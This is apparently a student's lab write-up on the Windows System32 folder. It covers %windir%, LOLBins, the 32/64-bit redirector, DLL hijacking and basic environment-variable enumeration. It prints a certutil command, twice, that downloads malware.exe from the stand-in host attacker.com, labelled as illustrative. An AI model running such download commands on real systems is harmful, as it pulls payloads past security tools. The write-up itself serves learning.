# Task 5: The Windows\System32 Folder

## Question
- **Q:** What is the system variable for the Windows folder?
- **A:** `%windir%`

## Security-relevant concepts

### LOLBins (Living Off The Land Binaries)
System32 is full of legitimate, Microsoft-signed binaries — `certutil.exe`, `rundll32.exe`, `mshta.exe`, and others — that were never meant to be security tools but end up abused constantly because AV and EDR tend to trust them by default. That's the entire idea behind "living off the land": the attacker isn't bringing in custom malware, just repurposing tools that are already trusted and already on the box.

### The file system redirector
A detail that trips people up: `System32` holds **64-bit** binaries, while `SysWOW64` holds **32-bit** ones — backwards from what the names suggest. When a 32-bit process tries to access System32, Windows transparently redirects it to SysWOW64 instead.

### DLL hijacking
An attacker drops a malicious DLL with the same name as a legitimate one, in a location that Windows' DLL search order checks *before* the real System32 copy. When a legitimate program loads that DLL by name, it picks up the attacker's version instead — and the malicious code now runs inside the context of a trusted, signed process.

## Commands

### `certutil -urlcache -split -f http://attacker.com/malware.exe C:\temp\malware.exe`
This is illustrative, not something actually run against the lab target. Breaking it down:
1. `certutil` — a legitimate tool meant for managing digital certificates.
2. `-urlcache -split -f` — a combination of flags that turns it into a file downloader, an undocumented but well-known side effect of its caching behavior.
3. The URL — the (in this example, attacker-controlled) source.
4. The local path — where the downloaded file lands.

Because `certutil.exe` is signed by Microsoft, plenty of security products don't flag it by default, which is exactly why it keeps showing up in real intrusions as a way to pull down a payload without tripping an alert.

```cmd
certutil -urlcache -split -f http://attacker.com/malware.exe C:\temp\malware.exe
```

### `echo %windir%`
Prints the value of the `%windir%` environment variable, normally `C:\Windows`. Scripts reference it instead of hardcoding the path so they still work regardless of which drive Windows is installed on.

```cmd
echo %windir%
```

### `set`
Lists every environment variable in the current session — usernames, paths, processor info, and so on. Worth checking during recon, since environment variables occasionally leak internal hostnames or paths that are useful later.

```cmd
set
```

### `Get-ChildItem Env:`
The PowerShell equivalent of `set`. PowerShell exposes environment variables through a provider (`Env:`) that behaves like a virtual drive, so the same cmdlet used to list files in a real folder also works here.

```powershell
Get-ChildItem Env:
```

### `Get-Command -Name "*.exe" -CommandType Application | Where-Object {$_.Source -like "*System32*"}`
1. `Get-Command -Name "*.exe" -CommandType Application` finds every executable known to the system as a runnable command.
2. Piped into `Where-Object {$_.Source -like "*System32*"}`, which filters that list down to anything whose path contains "System32".

Useful as a quick inventory of everything runnable inside System32 — handy when you're mapping out which LOLBins are actually present on a given box.

```powershell
Get-Command -Name "*.exe" -CommandType Application | Where-Object {$_.Source -like "*System32*"}
```
